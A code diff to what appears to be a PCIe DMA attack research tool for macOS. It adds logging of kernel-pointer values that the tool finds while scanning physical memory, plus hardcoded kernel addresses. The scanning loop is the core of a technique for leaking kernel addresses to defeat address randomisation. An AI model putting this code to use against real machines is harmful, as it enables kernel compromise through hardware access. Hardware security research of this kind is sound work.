@@ -33,8 +33,10 @@
  * SUCH DAMAGE.
  */
 
+#include <signal.h>
 #include <stdint.h>
 #include <stdio.h>
+#include <stdlib.h>
 
 #include "mask.h"
 #include "macos-mbuf-manipulation.h"
@@ -125,12 +127,10 @@ respond_to_packet(struct packet_response_state *state,
 		}
 
 		state->devfn = config_request_dword2->device_id;
-		printf("Set device ID to 0x%x.\n", state->devfn);
 		response = PR_RESPONSE;
 		req_addr = get_config_req_addr(in);
 
 		if (dir == TLPD_READ) {
-			printf("Responding to CFG Read.\n");
 			out->data_length = 4;
 			switch (req_addr) {
 			case 0: /* vendor and device id */
@@ -172,6 +172,22 @@ respond_to_packet(struct packet_response_state *state,
 
 #define MBUFS_PER_PAGE	(4096 / sizeof(struct mbuf))
 
+FILE *out_file;
+
+void cleanup() {
+	fprintf(stderr, "Doing cleanup.\n");
+	if (out_file != NULL) {
+		fclose(out_file);
+	}
+}
+
+void signal_cleanup(int sig) {
+	exit(1);
+}
+
+uint64_t INIT  = 0xffffff8000a15710;
+uint64_t PANIC = 0xffffff8000337820;
+
 int
 main(int argc, char *argv[])
 {
@@ -191,6 +207,22 @@ main(int argc, char *argv[])
 	uint64_t next_read_addr = 0x000000;
 
 	uint64_t candidate_symbols[32];
+
+	out_file = NULL;
+	atexit(cleanup);
+	signal(SIGINT, signal_cleanup);
+
+	if (argc != 2) {
+		fprintf(stderr, "Usage: %s <output_file>.\n", argv[0]);
+		return 1;
+	}
+
+	out_file = fopen(argv[1], "w");
+	printf("out_file pointer: %#p.\n", out_file);
+	if (ferror(out_file)) {
+		perror("Error opening dump file");
+		return 2;
+	}
 
 	int init = pcie_hardware_init(argc, argv, &physmem);
 	if (init) {
@@ -220,7 +252,11 @@ main(int argc, char *argv[])
 		case AS_UNINITIALISED:
 			break;
 		case AS_LOOKING_FOR_LEAKED_SYMBOL:
-			puts("L!");
+		   /*if (next_read_addr > 0x500000) {*/
+			if (next_read_addr > 0x8200000) {
+				next_read_addr = 0;
+				fprintf(out_file, "reset\n");
+			}
 			if ((next_read_addr & 0xFFFFFF) == 0) {
 				printf("0x%lx.\n", next_read_addr);
 				fflush(NULL);
@@ -243,12 +279,16 @@ main(int argc, char *argv[])
 				/*printf("Slide: 0x%lx.\n", candidate_symbols[i] -*/
 				/*0xffffff8000b283c0l);*/
 				/*}*/
+				bool read_symbol = false;
 				if ((candidate_symbols[i] & 0xFFFFFFF000000000) ==
 					                        0xFFFFFF8000000000) {
-					printf("\nFound symbol.\n");
-					printf("At address 0x%lx.\n", read_addr +
-						i * sizeof(uint64_t));
-					printf("Address: 0x%lx.\n", candidate_symbols[i]);
+					read_symbol = true;
+					fprintf(out_file, "%#16lx: %#16lx\n",
+						read_addr + i * sizeof(uint64_t),
+						candidate_symbols[i]);
+				}
+				if (read_symbol) {
+					putchar('s');
 				}
 			}
 			break;
